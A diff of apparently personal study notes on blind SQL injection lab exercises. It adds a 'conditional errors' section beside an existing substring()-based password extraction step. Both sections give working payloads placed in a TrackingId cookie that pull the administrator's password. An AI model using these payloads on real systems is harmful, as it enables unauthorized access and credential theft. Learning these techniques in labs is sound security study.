@@ -54,4 +54,8 @@ below is used to find the length of password using *length()* function
 To find characters of the password  using *substring()* function by changing index numbers after column name (here password)
 >**TrackingId=x'+UNION+SELECT+'a'+FROM+users+WHERE+username='administrator'+AND+substring(password,1,1)='a'--**
 
+### 7) conditional errors
+The condition after *WHEN* should be false to get no error and is true if error occured.
+>**TrackingId='+UNION+SELECT+CASE+WHEN+(username='administrator')+THEN+to_char(1/0)+ELSE+NULL+END+FROM+users--**
+
 
